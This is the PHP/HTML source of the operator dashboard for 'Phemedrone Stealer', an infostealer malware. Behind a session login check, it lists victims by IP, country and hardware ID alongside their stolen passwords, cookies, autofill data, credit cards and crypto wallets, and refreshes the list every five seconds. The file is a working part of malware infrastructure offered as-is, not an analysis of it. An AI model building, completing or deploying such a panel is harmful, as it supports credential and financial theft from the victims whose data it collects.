<?php

session_start();

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header('Location: ../index.php');
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel - Phemedrone</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
	<link rel="icon" type="image/x-icon" href="./assets/icon.ico">
    <script src="api-worker.js"></script>
</head>
<body>
    <div id="particles-js"></div>
    
    <div class="container">
        <div style="display: flex; justify-content: center; align-items: center; margin-bottom: 10px; margin-top: -30px;">
            <h2>Phemedrone Stealer</h2>
        </div>
       
        <table class="data-table">
            <thead>
                <tr>
                    <th>IP</th>
                    <th>Country</th>
                    <th>HWID</th>
                    <th>Passwords</th>
                    <th>Cookies</th>
                    <th>Autofills</th>
                    <th>Credit Cards</th>
                    <th>Wallets</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="tableBody">
               
            </tbody>
        </table>
        <div class="pagination" style="margin-top: 15px;">
            <button id="prevPage" class="btn btn-page"><i class="fas fa-chevron-left"></i> Previous</button>
            <span id="pageInfo">Page <span id="currentPage">1</span> of <span id="totalPages">1</span></span>
            <button id="nextPage" class="btn btn-page">Next <i class="fas fa-chevron-right"></i></button>
        </div>
        <h4 id="total-logs" style="font-weight: normal;">Total logs</h4>
        
    </div>
    
    <script src="table-master.js"></script>

    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>

    <script>
        setInterval(function() {
        renderTable();
        }, 5000);
    </script>

    <script>
        particlesJS("particles-js", {
            particles: {
                number: { value: 80, density: { enable: true, value_area: 800 } },
                color: { value: "#ffffff" },
                shape: { type: "circle" },
                opacity: { value: 0.5, random: true },
                size: { value: 3, random: true },
                line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
                move: { enable: true, speed: 2, direction: "none", random: true, straight: false, out_mode: "out" }
            },
            interactivity: {
                detect_on: "canvas",
                events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" } },
                modes: { repulse: { distance: 100, duration: 0.4 }, push: { particles_nb: 4 } }
            },
            retina_detect: true
        });
    </script>
</body>
</html>
